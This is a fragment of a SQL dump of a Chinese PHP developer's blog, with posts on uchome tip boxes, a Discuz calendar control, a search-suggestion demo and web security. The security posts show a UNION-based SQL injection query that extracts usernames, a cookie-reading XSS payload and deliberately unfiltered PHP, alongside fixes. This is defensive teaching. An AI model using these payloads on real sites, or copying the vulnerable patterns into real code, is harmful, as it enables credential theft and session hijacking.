09:01:07<br />            [auctionnum] =&gt; 5<br />            [expectnum] =&gt; 45<br />        )<br /><br />    [1] =&gt; Array<br />        (<br />            [id] =&gt; 1<br />            [price] =&gt; 2.00<br />            [cost] =&gt; 3<br />            [name] =&gt; 4<br />            [luckyprice] =&gt; 5.00<br />            [start] =&gt; 6<br />            [end] =&gt; 7<br />            [auctionnum] =&gt; 8<br />            [expectnum] =&gt; 9<br />        )<br /></p><p>sql2 result：</p><p>Array<br />(<br />    [0] =&gt; Array<br />        (<br />            [id] =&gt; 1<br />            [price] =&gt; 0.40<br />            [cost] =&gt; 1<br />            [name] =&gt; 香蕉<br />            [luckyprice] =&gt; 0.01<br />            [start] =&gt; 2010-09-15 09:02:05<br />            [end] =&gt; 2010-09-16 09:01:07<br />            [auctionnum] =&gt; 5<br />            [expectnum] =&gt; 45<br />        )<br /><br />)<br /><br /></pre><p><a href="http://localhost/paperenblog/file/72" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/72" alt="20100917203402" title="上传于2010-09-17"></a></p><p>sql1抽取的数据中多了一组数据，正是1，2，3，4，5，6，7，8，9，而出来的数据类型与goods表一致，so，当我再猜测user表中用户名那个字段是username时<br /></p><p>select * from goods where id=1 union select 1,2,3,username,5,6,7,8,9 from user</p><pre>Array<br />(<br />    [0] =&gt; Array<br />        (<br />            [id] =&gt; 1<br />            [price] =&gt; 0.40<br />            [cost] =&gt; 1<br />            [name] =&gt; 香蕉<br />            [luckyprice] =&gt; 0.01<br />            [start] =&gt; 2010-09-15 09:02:05<br />            [end] =&gt; 2010-09-16 09:01:07<br />            [auctionnum] =&gt; 5<br />            [expectnum] =&gt; 45<br />        )<br /><br />    [1] =&gt; Array<br />        (<br />            [id] =&gt; 1<br />            [price] =&gt; 2.00<br />            [cost] =&gt; 3<br />            [name] =&gt; paperen //注意这里<br />            [luckyprice] =&gt; 5.00<br />            [start] =&gt; 6<br />            [end] =&gt; 7<br />            [auctionnum] =&gt; 8<br />            [expectnum] =&gt; 9<br />        )<br />)<br /></pre><p>如果我又猜中了放密码的那个字段为password不就同样可以查出来了。</p><p>很显然这是我们意想不到的结果，本来就是想查一张商品表没想到反被人连管理员都查出来了。所以千万不要相信来自客户端的数据，这是真理。</p><p>最后，paperen还是叮嘱一句最好也对这个get来的id进行一下类型转换，既然肯定是一个数字，可以使用intval函数或者is_numeric检查一下。</p></p>', 2, 1, 875, 0, 1, 0, 1284727884, 0);
INSERT INTO `post` (`id`, `title`, `urltitle`, `categoryid`, `content`, `authorid`, `ispublic`, `click`, `good`, `bad`, `savetime`, `posttime`, `isdraft`) VALUES
(55, 'uchome中提示框的调用', 'tipbox-in-uchome', 2, '<p>众所周知的事情，discuz的产品是被广泛使用的，大部分论坛都是使用discuz的，而uchome也作为discuz在sns领域的产品被广泛使用，充分扩展了论坛用户的联系，从一个论坛变为一个社区。而且关键是源代码公开的，也就是说你可以看它的代码并根据自己需要加入自己的代码与二次开发，或者二次开发discuz的产品能被作为php程序员的基本技能之一。</p><p>最近，也不能说是最近了……近一个月……paperen研究了uchome，虽然也并没有把所有功能都看完，但是整体的模式还是明白了，有MVC的味道。paperen主要看了cp.php与space.php的代码，还有它是如何处理ajax的请求的。而paperen发的这篇博文的主题就是一个很简单ajax的运用。</p><p><a href="http://localhost/paperenblog/file/73" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/73" alt="20101007104820" title="上传于2010-10-07"></a></p><!--more--><p>paperen在个人主页cp.php中添加了一个新页面的链接，作为自己来随便测试，当然你需要去更改一下它的模板文件，况且叫模板吧（就是template文件夹中的default里面的space_index.htm）。</p><p>cp.php最后会 </p><pre>include_once(S_ROOT.''./source/cp_''.$ac.''.php''); </pre><p>也就是说根据cp.php?ac=mymod这个ac参数决定调入哪个模型文件，您还需要更改一下cp.php中的$acs数组，里面已经固定了所有允许的模型名称，你加入你那个相应功能的名称就可以（paperen这里就是mymod），在source里面也创建一个新模型文件（paperen这里就是cp_mymod.php），里面很简单放一句</p><pre>include_once template("cp_mymod");</pre><p>您再查看一下template这个函数，位于source里面的function_common.php中</p><pre>function template($name) {<br />	global $_SCONFIG, $_SGLOBAL;<br /><br />	if($_SGLOBAL[''mobile'']) {<br />		$objfile = S_ROOT.''./api/mobile/tpl_''.$name.''.php'';<br />		if (!file_exists($objfile)) {<br />			showmessage(''m_function_is_disable_on_wap'');<br />		}<br />	} else {<br />		if(strexists($name,''/'')) {<br />			$tpl = $name;<br />		} else {<br />			$tpl = "template/$_SCONFIG[template]/$name";<br />		}<br />		$objfile = S_ROOT.''./data/tpl_cache/''.str_replace(''/'',''_'',$tpl).''.php'';<br />		if(!file_exists($objfile)) {<br />			include_once(S_ROOT.''./source/function_template.php'');<br />			parse_template($tpl);<br />		}<br />	}<br />	return $objfile;<br />}<br /><br /></pre><p>$_SGLOBAL[''mobile'']这个是判断是不是手机访问网站的，是就调用专用的文件显示，这里无视掉，因为不是paperen说的话题。else中的一大段其实做的功能很简单，判断该模板文件是否已经转换成缓存文件，已经生成了缓存文件就直接将路径返回，引入。而uchome中有自己一套模板语言，你可以看看template/default中的一些htm文件，里面貌似是没有任何php的代码，但是随处可见</p><pre>&lt;!--{template header}--&gt;<br /><br />&lt;!--{if $topic}--&gt;<br />	&lt;!--{template cp_topic_menu}--&gt;<br />&lt;!--{else}--&gt;<br /></pre><p>这样一些代码，并不是没有意思的，这些代码需要经过编译才有意义，parse_template函数就是uchome自定义模板编译功能的函数。有兴趣可以看看，有大量正则。编译完后就会存放在data/tpl_cache路径下，你可以到这里看看，随便打开一个文件看看就已经很熟悉了，里面加入了php标志&lt;?php ?&gt;并将模板中的一些代码转变为php的代码，但是你不要直接在这个缓存文件中改因为一旦更新缓存你的改动又得白费，你应该去编辑template中的文件。</p><p>继续说关于提示框的调用……在研究这个前端功能时你可以从uchome中的默认功能开始，比如我的状态那<br /></p><p><a href="http://localhost/paperenblog/file/74" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/74" alt="20101007105102" title="上传于2010-10-07"></a></p><p>当你更新状态后就会有一个提示框，提示您获得的奖励。</p><p>查看其代码，涉及了ajaxpost，reloadMood，showreward……还有不少，ajaxpost这个纯属是ajax引擎的，动态地在页面插入一个iframe，将form的target指向这个iframe，然后启动onload动作，在网速慢的时候你会发觉在右上方会有一个loading...的提示，代码不少所以就补贴上来了，ajaxpost位于source/script_ajax.js中，重点来看看reloadMood与showreward。</p><pre>function reloadMood(showid, result) {<br />		var x = new Ajax();<br />		x.get(''cp.php?ac=doing&amp;op=getmood'', function(s){<br />			$(''mood_mystatus'').innerHTML = s;<br />		});<br />		//提示获得积分<br />		showreward();<br />		hiddenstatus();<br />	}<br /></pre><p>reloadMood向cp.php发出一个请求，获得当前的状态并更改页面上的状态。之后调用showreward提示积分情况，最后的hiddenstatus应该就是将更新状态时出现的表情隐藏并初始化一些html。</p><p>showreward位于source/script_common.js中。</p><pre>function showreward() {<br />	if(Cookie.get(''reward_notice_disable'')) {<br />		return false;<br />	}<br />	var x = new Ajax();<br />	x.get(''do.php?ac=ajax&amp;op=getreward'', function(s){<br />		if(s) {<br />			msgwin(s, 2000);<br />		}<br />	});<br />}<br /></pre><p>判断一下cookie中是不是存在一个叫reward_notice_disable的键值并返回其数据（cookie的js处理在source/script_cookie.js中），而向do.php发出一个请求，并带上ac与op参数，其实还有一个参数inajax会被默认加上的。那么就很明确了直接去看do.php这个文件。</p><pre>include_once(S_ROOT.''./source/do_''.$ac.''.php'');</pre><p>还是与cp.php的做法一样，根据ac导入相应的模型文件，这里固定为ajax所以就是do_ajax.php，继续看这个文件，额~~很好~~就是这样。</p><pre>$op = empty($_GET[''op''])?'''':$_GET[''op''];<br />if($op == ''comment'') {...}else if($op == ''other''){...}else if(...){...}<br />include template(''do_ajax'');<br /></pre><p>再根据op决定执行某个动作，这里自己随便加入一个elseif ($op == ''getmytip'')里面什么都不写就行，然后会根据缓存情况对template/default中的do_ajax.htm文件进行编译，paperen也随便加入了一段。<br /></p><pre>&lt;!--{elseif $op == ''getmytip''}--&gt;<br />	&lt;div class="popupmenu_layer"&gt;<br />    	&lt;p&gt;友情提示&lt;/p&gt;<br />        &lt;p class="btn_line"&gt;<br />        	仅供测试之用，没有任何意义<br />        &lt;/p&gt;<br />        &lt;p&gt;&lt;strong&gt;囧rz&lt;/strong&gt;&lt;/p&gt;<br />    &lt;/div&gt;<br />&lt;!--{/if}--&gt;<br /></pre><p>更新一下缓存，之后就可以试了。在自己新加入的模板文件中加入。</p><pre>&lt;script&gt;<br />	function showmytip() {<br />		var x = new Ajax();<br />		x.get(''do.php?ac=ajax&amp;op=getmytip'', function(s){<br />			if(s) {<br />				msgwin(s, 4000);<br />			}<br />		});<br />	}<br />	showmytip();<br />&lt;/script&gt;<br /></pre><p>然后打开您那个自定义页面就会看到一个提示框出现，并4秒后自动消失，msgwin这个函数就是将s的内容进行一下填充与设置定时消失动作效果而已，位于script_common.js中。就是这么简单~~</p><p>可能一开始会有点乱但是整个代码思路还是挺不错的，各模块之间划分得很清晰。老实说看看这种好的代码也是一种提高自身水平的途径，不过您自己也要动动手，光看真的没意思。</p></p>', 2, 1, 1014, 1, 0, 0, 1286422017, 0),
(56, 'js日历控件 扒自Discuz', 'calendar-in-discuz', 3, '<p>一直一直以来就想整理出一个js控件，每次paperen要弄js日历控件就得上网找，当然jquery-ui的可以但是又觉得貌似需要的引擎有点多本身就需要jquery的框架又要引入ui的js文件还有图片与css，重要的是它那个改起来不会……而一些不兼容浏览器的控件也有（干脆就不用了不兼容不能拉出来见人的）。而今天终于有机会让paperen我扒了discuz的下来（在ie，火狐，opera下测试没问题，其他的就不知道了），并最终整合到只有一个js文件就能调用，当然也需要一些css文件的支持，不然会不好看。</p><p>DEMO地址 <a href="http://iamlze.cn/demo/js-calendar/" target="_blank">http://iamlze.cn/demo/js-calendar/</a></p><p><a href="http://localhost/paperenblog/file/75" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/75" alt="20101017140222" title="上传于2010-10-17"></a></p><!--more--><p>目前就整理出两个样式，一个绿色(http://iamlze.cn/demo/js-calendar/green.css)，一个蓝色(http://iamlze.cn/demo/js-calendar/blue.css)</p><p>调用可以使用主动点击触发型也就是主动型，还可以使用被动点击触发型也就是被动型。</p><p>相关调用代码可以查看源代码，主要是showcalendar，其中第二个参数是日历绑定的元素，如果是text输入框就是text输入框这个元素，如果是其他就是其他元素。</p><p>注意html中需要有一个ID为append_parent的元素，calendar.js的引入要放在html的最后。（详细看demo页面的源代码）</p><p>下面为两种调用方法：</p><pre>onclick="showcalendar(event, this)" 自身调用<p>onclick="showcalendar(event, $(''calendar2''))" 对id为calendar2的text框调用</pre><p>什么！您还有更好的？麻烦发个给paperen！！邮箱 paperen@gmail.com</p><p>什么！您觉得很好？请感谢discuz的前端开发人员吧！！</p><p>PS：一位仁兄给我发了邮件推荐了这个 <a href="http://www.my97.net/">http://www.my97.net/</a> 感谢感谢~~</p></p>', 2, 1, 1658, 0, 0, 0, 1287295891, 0),
(57, 'GooMa[纯属恶搞]', 'gooma-orz', 3, '<p>前几天paperen跟一位也是从事php行业的朋友聊天，之后他向paperen展示了他做的一个物质系统，那数据确实蛮多的，远程过去看他玩了会，paperen就看中了那个搜索提示功能，咦！当输入中文的时候也可以有提示哇~~从而又想起前前几天一位从事java的朋友问paperen一个中文索引的问题，咦！当时不就是想到一个如何对姓名排序的问题，就像paperen部索爱W550C的电话簿中输入L会找到李，梁的姓，当时看到那个搜索提示觉得很神奇(虽然google的时候也经常是有了……但是你总不能给google发个邮件问问你首页那个搜索提示是咋整的捏吧)，paperen一直是以为用数据库来做这个功能，但是那位朋友说了一个神奇的功能“中文转拼音”。wow~~这次赚了，所以就有了这个“姑妈”啦。</p><p>中文转拼音的源代码去google一下就大把，这里随便放个链接，<a href="http://code.google.com/p/sukulaqiuplugins/source/browse/trunk/php中文转拼音（用于url）/py.php?r=26" target="_blank">猛点here</a></p><p>good！总而言之，是一堆比较长的代码，看不懂就当养养眼吧。下面放出demo地址-<a href="http://iamlze.cn/demo/gooma/" target="_blank">猛点here</a>，压缩包地址-<a href="http://iamlze.cn/demo/gooma/Demo.rar">猛点here</a></p><!--more--><p>至于这个要说的东西其实是不太多的，对于前端固然要使用ajax，paperen使用的还是jquery的框架，注意是1.4.3的版本了，而且还是直接调用google那边的jquery框架文件，所以如果你本地不能上网的就需要下载下来然后改改引入jquery框架那一段了。</p><p>对于js的设计思路，其实也很明确，你需要出现搜索提示，那么搜索框里面一定需要有内容才能给你提示啦~~搜索提示的触发点放在keyUp事件时，也就是说keyUp事件发生后要判断一下搜索框里面是否有内容，有则ajax向服务端发送请求获得返回数据。</p><pre>$.ajax({<br />	type: "POST",<br />	url: "search.php",<br />	data: "skey=" + skey,<br />	success: function(data){<br />		if (data) {<br />			var json_data = eval(''('' + data + '')'');<br />			//alert(json_data.length);<br />			for(i=0;i&lt;json_data.length;i++) {<br />				list_html += "&lt;li&gt;&lt;a href=\\"javascript:void(0);\\" onclick=\\"do_search(''" + json_data[i].k + "'');\\"&gt;&lt;span class=\\"key\\"&gt;" + json_data[i].k + "&lt;/span&gt;&lt;span class=\\"s_num\\"&gt;" + json_data[i].n + "&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;";<br />			}<br />		} else {<br />			list_html = "&lt;li&gt;&lt;a href=\\"javascript:void(0);\\" onclick=\\"do_search(''今天囧了没'');\\"&gt;&lt;span class=\\"key\\"&gt;今天囧了没&lt;/span&gt;&lt;span class=\\"s_num\\"&gt;17&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;";<br />		}<br />		$("#search_tipbox").html(list_html);<br />	}<br />});<br /></pre><p>而服务端返回的数据是使用json_encode封装的，在js接收返回的数据后要进行一定的处理eval(''('' + data + '')'')，将json数据转换成对象object的操作，当然你可以在$.ajax里面加一个参数datatype:json，那么就不用手动用eval转了，不过那样不方便调试。<br /></p><p>然后根据数据的子元素数量一个一个拆下来，然后取出数据并封装到一个&lt;li&gt;&lt;a&gt;...&lt;/a&gt;&lt;/li&gt;这种html结构里面，最后将$("#search_tipbox")里面的内容填为list_html这个变量，则就是完成了DOM的操作了。之后就是效果，很简单就是show()。</p><p>不过为了让定位更加自动化，写了一个函数来获取搜索框的位置。</p><pre>//获取输入框位置与宽度参数<br />function get_skbox_var() {<br />	var tb_offset = $("#skey_container").offset();<br />	var tb_height = $("#skey_container").height();<br />	var tb_width = $("#skey_container").width() - 3;<br />	var tmp = {<br />		''top'' : tb_offset.top + tb_height ,<br />		''left'' : tb_offset.left ,<br />		''width'' : tb_width<br />	};<br />	return tmp;<br />}</pre><p>将搜索离顶端离左端的数值以及它的宽度值封装到一个对象中然后返回。之后的事情你也会的了，就是让设置提示框相应的属性。</p><pre>$("#search_tipbox").css(''top'', tipbox_var.top);<br />$("#search_tipbox").css(''left'', tipbox_var.left);<br />$("#search_tipbox").css(''width'', tipbox_var.width);<br /></pre><p>最后还需要让提示框更人性化一些，就是当焦点不在搜索框的时候就不让它出来了。这个问题看上去是个小问题，但是在实际中paperen也想了一段时间。</p><p>解决办法是：</p><pre>$("#keyword").click(function() {return false;});<br />$(document).click(function(){<br />	$("#search_tipbox").slideUp(''fast'', function(){<br />		$("#search_tipbox").html('''');<br />	});<br />});<br /></pre><p>如果不加入第一行，keyword的click事件的话，就会有个小bug，就是点击搜索框的时候提示框也会收回，因为它也会触发document的click事件，这个是与js的事件流有关，冒泡型事件，所谓冒泡事件就是触发某个元素最终会触发到最顶层的元素。paperen对这个也是有点模糊，你可以去看看《Javascript高级程序设计--Nicholas》这本关于javascript的书真的很好，如果没有这本书自己也不妨互联网一下。</p><pre>$("#keyword").click(function() {alert(2);});<br />$(document).click(function(){<br />	alert(1)<br />	$("#search_tipbox").slideUp(''fast'', function(){<br />		$("#search_tipbox").html('''');<br />	});<br />});<br /></pre><p>或者再试试将上面这段代码覆盖再刷新看看，当点击搜索框时首先是弹出一个警告框“2”，这个是理所当然的啦，但之后还会触发document的click事件接着弹出“1”，也就是说点击搜索框也会触发了根元素的click事件。那么解决办法就很简单了，在触发子元素后加上return中断事件流的继续，return false。</p><p>关于服务端的程序嘛，就是最简单的了，自己可以下那个整个压缩包打开里面看看php的代码，也就那么几行，里面将一个缓存文件data.php引过来后就用里面的$cache变量了，所以看到search.php里面的这一句时不要糊涂了，$data = $cache[$skey_fc];不要说cache变量没有声明。</p><p>将$cache变量分解然后弄到$result这个临时变量中，然后用json_encode对result封装(你可以要注意一下在你空间上的php版本有没有这个函数，paperen的就没有，所以在function_common.php文件里面有一个json_encode的函数，不然会出错)。</p><p>对于data.php文件就是已经写死了一个数据文件而已，如果要考虑到由数据库生成的话，可能还要涉及到一些生成缓存的操作，并组织成一个数据结构。下面也附件上三个函数，paperen也是很久之前从discuz的源代码上面摘的，好使好用，居家良药~~</p><pre>function arrayeval($array, $level = 0) {<br />    $space = '''';<br />    for($i = 0; $i &lt;= $level; $i++) {<br />        $space .= "\\t";<br />    }<br />    $evaluate = "Array\\n$space(\\n";<br />    $comma = $space;<br />    foreach($array as $key =&gt; $val) {<br />        $key = is_string($key) ? ''\\''''.addcslashes($key, ''\\''\\\\'').''\\'''' : $key;<br />        $val = !is_array($val) &amp;&amp; (!preg_match("/^\\-?\\d+$/", $val) || strlen($val) &gt; 12 || substr($val, 0, 1)==''0'') ? ''\\''''.addcslashes($val, ''\\''\\\\'').''\\'''' : $val;<br />        if(is_array($val)) {<br />                $evaluate .= "$comma$key =&gt; ".arrayeval($val, $level + 1);<br />        } else {<br />                $evaluate .= "$comma$key =&gt; $val";<br />        }<br />        $comma = ",\\n$space";<br />    }<br />    $evaluate .= "\\n$space)";<br />    return $evaluate;<br />}<br /><br />function cache_write($name, $var, $values) {<br />    $cachefile = ROOT.''/data/''.$name.''.php'';<br />    $cachetext = "&lt;?php\\r\\n".<br />        //"if(!defined(''INRUN'')) exit(''Access Denied'');\\r\\n".<br />        ''$''.$var.''=''.arrayeval($values).<br />        "\\r\\n?&gt;";<br />    if (!swritefile($cachefile, $cachetext)) {<br />        exit("File: $cachefile write error.");<br />    }<br />}<br />function swritefile($filename, $writetext, $openmod=''w'') {<br />    if(@$fp = fopen($filename, $openmod)) {<br />        flock($fp, 2);<br />        fwrite($fp, $writetext);<br />        fclose($fp);<br />        return true;<br />    } else {<br />        return false;<br />    }<br />}<br /></pre><p>其中cache_write这函数里面的cachefile那个路径可能需要根据自己的项目改变一下，或者增加多一个参数用来接收生成缓存文件的路径这样就更加灵活了。而arrayeval这个函数就牛×了，自己看吧，真的厉害。</p><p>使用的时候直接调用cache_write(''缓存文件名'',''缓存数据的变量名'',''变量数据可以是数组'');</p><p>至于中文转拼音这个，就没啥好说的了，因为paperen没了解……代码是来自网络的，貌似就是将中文的ascii转来转去，然后又移位又运算……paperen没看明白是怎一个算法……感觉很神奇，有谁了解的话解析一下也好。用法很简单$skey_to_py = pinyin($skey, ''utf-8'');如果你页面是gb2312的话这里第二个参数可以不填了，因为默认就是gb2312。</p><p>最后说明一下，GooMa，姑妈这个纯属恶搞而已，不过我觉得自己设计的那个logo还是挺cool的，字体好看，字体是BoomBox，有兴趣的可以去搜搜。</p></p>', 2, 1, 711, 0, 0, 0, 1289351437, 0),
(58, '最近碰到的一些WEB安全问题', 'about-safe-of-theweb', 4, '<p>近来paperen总想写点东西但又写不出来，每月一篇还真"月经"似的……最近对公司的WEB项目进行一些安全测试，又提及到一些WEB安全的问题，改了那个烂摊子差不多半年了才终于来到了安全测试的份上，阿叔用了不少软件来检测这个web项目，结果正如paperen想象中一样，N多漏洞提示。之前的代码写得确实不太严谨呢，对一些参数就明显没有过滤，这样导致的问题会比较严重，比如一个叫Cross Site Scripting的漏洞(就是一个能注入javascript的漏洞无论在URL还是提交的表单里面注入)，严重的是SQL Inject漏洞(sql注入是在参数中构造特殊的字符串从而爆出数据库重要信息或者能执行一些危险的操作)，除了程序本身导致的漏洞外还有一些服务器配置的漏洞也需要修复，但是60%的漏洞主要是由程序导致的，这确实是程序员要明白的，一个好的web程序不应该只是从可运行性上去分析，重视质量你会得到更多。<br /></p><p>阿叔使用了好几个测试工具，其实测试出来的结果基本都是差不多的，以下的漏洞主要是使用一个叫iiscan(亿思公司的)的来扫描站点得到的漏洞报告，还是蛮不错的。</p><p>在此说下碰到的几个漏洞。</p><!--more--><p>1.Cross Site Scripting(红色漏洞)</p><p>跨站脚本漏洞，即XSS，通常用Javascript语言描述，它允许攻击者发送恶意代码给另一个用户。因为浏览器无法识别脚本是否可信，跨站漏洞脚本便运行并让攻击者获取其他用户的cookie或session。<br /></p><p>如果觉得听起来貌似有点让人摸不着头脑，不妨可以思考一下paperen下面写的一个页面。</p><pre>&lt;?php<br />setcookie(''test'', 1234);<br />?&gt;<br />&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;<br />&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;<br />&lt;head&gt;<br />&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;<br />&lt;title&gt;How to use Css&lt;/title&gt;<br />&lt;/head&gt;<br /><br />&lt;body&gt;<br />&lt;script type="text/javascript"&gt;<br />var yourcookie = document.cookie<br />alert(yourcookie);<br />//您可以使用ajax将cookie传送到另一个地方接收从而偷取了相关的信息<br />&lt;/script&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></pre><p>或者您会想怎么可能会让入侵者在文件中放入这样一段JS呢？想想你站点上的表单任何允许信息提交的地方。</p><pre>&lt;?php<br />setcookie(''test'', 1234);<br />?&gt;<br />&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;<br />&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;<br />&lt;head&gt;<br />&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;<br />&lt;title&gt;How to use Css&lt;/title&gt;<br />&lt;/head&gt;<br /><br />&lt;body&gt;<br />&lt;?php<br />	$username = isset( $_POST[''username''] ) ? $_POST[''username''] : '''';<br />	echo $username;<br />?&gt;<br />&lt;form method="post" action=""&gt;<br />&lt;p&gt;&lt;input type="text" name="username" style="width:300px;padding:3px;" /&gt; &lt;input type="submit" value="提交" /&gt;&lt;/p&gt;<br />&lt;/form&gt;<br />&lt;!-- 试试在提交中输入再提交看看&lt;script&gt;var yourcookie = document.cookie;alert(yourcookie);&lt;/script&gt; --&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></pre><p><a href="http://localhost/paperenblog/file/105" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/105" alt="20101209085347" title="上传于2010-12-09"></a></p><p>如果这里的username数据是要存入数据库的话可想而知能执行这段script的地方就不只局限在本页面了，任何查看到这个username的地方都会执行这段script。您在想想如果您是管理员登陆了后台并记录了cookie作为身份验证的标志，然后查看能显示这个username的信息的页面时，就不知不觉间泄漏了自己的cookie信息了。这段js可以使用ajax向其他地方传输一些数据从而实现了入侵者的目的。</p><p>很明显这个漏洞是由程序没对提交的信息进行过滤造成的，其实php中内置的好几个函数就可以对数据进行过滤htmlspecialchars，htmlentities，干脆点的就用strip_tags。将接收数据的地方稍微一改就可以了。</p><pre>$username = isset( $_POST[''username''] ) ? htmlspecialchars( $_POST[''username''] ) : '''';</pre><p>当然你可以在站点初始化时使用一个迭代将所有的全局变量$_GET,$_POST进行一下过滤。</p><pre>function shtmlspecialchars($string) {<br /> if(!is_array($string)) return htmlspecialchars($string);<br /> foreach($string as $key =&gt; $val) $string[$key]=shtmlspecialchars($val);<br /> return $string;<br />}<br /><p>$_GET = shtmlspecialchars($_GET);<br />$_POST = shtmlspecialchars($_POST);<br /></pre><p>但是对GET与POST全局变量进行过滤需要根据自己需求弄吧，有时候如果有个编辑板的话可能就不需要对html过滤，不过也可以过滤一下存数据库在输出的时候再使用htmlspecialchars_decode或者html_entity_decode还原回来。反正自己看着办吧。</p><p>2.PHPSESSID session fixation(黄色漏洞)</p><p>通过注入一个客户的PHPSESSID就可能修改PHP session cookie.通常攻击者会操作cookie值去通过网站的认证。</p><p>paperen自己稍微查了一下资料 <a href="http://hi.baidu.com/chendezh2/blog/item/16059a37aa0dc985a71e1227.html" target="_blank">http://hi.baidu.com/chendezh2/blog/item/16059a37aa0dc985a71e1227.html</a> </p><p>session.use_cookies       设置是否使用cookie来存储session_id，session.use_only_cookies 设置是否只使用cookie来存储session_id<br />设置session.use_cookies=0将不使用cookie存储session_id,此时可能会使用URL来传递session_id(是否只用URL传递要看session.use_only_cookies的设置)<br />如果session.use_only_cookies被设置成1,则只能使用cookie存储session_id。如果同时设置session.use_cookies=0则无法传递session_id,这将导致无法使用SESSION功能<br />如果session.use_only_cookies被设置成0,则即使session.use_cookies=0,也能用URL来传递session_id,不过可能带来安全问题(例如：截获别人的url链接来获取别的用户的权限等)<br /></p><p>paperen这里也找了一篇文章有兴趣可以看看 <a href="http://www.cnblogs.com/BearsTaR/archive/2010/08/24/URL_SESSION_ID_LEEK.html" target="_blank">http://www.cnblogs.com/BearsTaR/archive/2010/08/24/URL_SESSION_ID_LEEK.html</a></p><p>而具体怎样实现paperen也未能了解，所以这里没有弄一个实例玩玩，paperen自己对"URL来传递session_id"这个没能理解，不知道是怎样实现的捏？待研究~要记得修改完要重启一下apache。</p><p>3.Directories with LIST permissions enabled(浅蓝色漏洞)</p><p>服务器可显示文件目录列表，这个是不推荐的，因为可能有些文件不希望被显示在web网站上，网站上不存在这些文件的链接。类似下图所示<br /></p><p><a href="http://localhost/paperenblog/file/106" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/106" alt="20101209132156" title="上传于2010-12-09"></a></p><p>paperen觉得这个应该要划为中等的，在本地测试倒是没什么问题，但是放到服务器上还是这样配置就有点说不过去。能看到站点的文件目录列表这个有点太可怕了，至少可以让入侵者将站点的目录理清得一清二楚，也就不用去猜测文件夹的名称了。</p><pre>解决办法：修改apahce的httpd.conf中的Directory<p>&lt;Directory /path/to/directory&gt;<br />Options -Indexes<br />&lt;/Directory&gt;<br /></pre><p>然后重启apache，更多设置你可以参考 <a href="http://lamp.linux.gov.cn/Apache/ApacheMenu/index.html" target="_blank">http://lamp.linux.gov.cn/Apache/ApacheMenu/index.html</a></p><p>4.Possible sensitive directories(绿色漏洞)</p><p>一个可能的敏感目录，其实意思很多人都是用这个名字的文件夹或者文件来放同一些功能，导致的结果是，入侵者可能会去猜测到你这个路径或者文件，为他的入侵提供方便。</p><p>而报告中的建议是"限制对该目录的访问或者删除该目录"，paperen认为这个可以根据各人实际情况吧，如果将文件名或文件夹的名称搞得十分特别也不是很好，可以使用这种敏感的名称，但写程序的或者是架构那个一定要想到某些文件被直接访问时应该发生什么情况，哪些文件你能直接访问什么文件你只能通过站点程序的调用。</p><p>paperen认为你况且可以在index.php中定义一个常量然后在其他视图啊什么的文件中去判断这个常量是否已经被定义了，没定义则exit掉。</p><pre>define(''INRUN'', 1);<br />if ( !defined( ''INRUN'' ) ) exit();<br /></pre><p>5.TRACE Method Enabled(绿色漏洞)</p><p>如果不必须的话可以禁用TRACE方法，关于trace的描述 <a href="http://www.cgisecurity.com/questions/httptrace.shtml" target="_blank">http://www.cgisecurity.com/questions/httptrace.shtml</a></p><p>解决方法 <a href="http://blog.superyu.com/article.asp?id=2113" target="_blank">http://blog.superyu.com/article.asp?id=2113</a>，在httpd.conf文件最后加入TraceEnable off然后重启apache<br /></p><p>报告中的漏洞就上面4种了，关于更多的漏洞不妨可以去 <a href="http://www.iiscan.com/" target="_blank">http://www.iiscan.com/</a> 的主页，点击"强大功能"看那个fusioncharts的报表，列了各种漏洞，点击各自的能进入查看具体描述。</p><p><a href="http://localhost/paperenblog/file/107" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/107" alt="20101209141523" title="上传于2010-12-09"></a></p><p>虽然它没有扫描出存在SQLinjection漏洞的，但是paperen还得要自己去试试到底这个项目中存不存在这个漏洞。关于SQLinjection漏洞paperen日后也会写一篇文章说说的，想了解的可以期待一下~~</p><p>在此也同时说说另一个不算得上是漏洞的但是也最好避免的，就是当访问站点不存在的路径时显示的信息问题。</p><p><a href="http://localhost/paperenblog/file/108" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/108" alt="20101209141513" title="上传于2010-12-09"></a></p><p>看到下面一行了么？将apache的版本与运行平台还有php版本都报出来了，有点不是很好，至于要隐藏它很简单。同样是修改httpd.conf中的ServerSignature参数，改为Off，然后重启apache，ok。又或者您可以自定义404错误页面同样是修改httpd.conf，将#ErrorDocument 404 /missing.html的#去掉并在后面修改为您要重定向的页面URL，保存后重启apache就ok，如果站点www目录中包含其他web应用的话在各自文件夹中加入.htaccess文件里面写上ErrorDocument 404 /missing.html就可以针对该应用进行404自定义。</p><p><a href="http://localhost/paperenblog/file/109" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/109" alt="20101209202029" title="上传于2010-12-09"></a></p><p>关于SQLinjection的漏洞下回再说说吧，对于网站开发人员与运营者来说是个恶梦，对于hacker们来说是个宝藏，偶尔玩玩还是挺有益身心。</p></p>', 2, 1, 798, 0, 0, 0, 1291897460, 0),
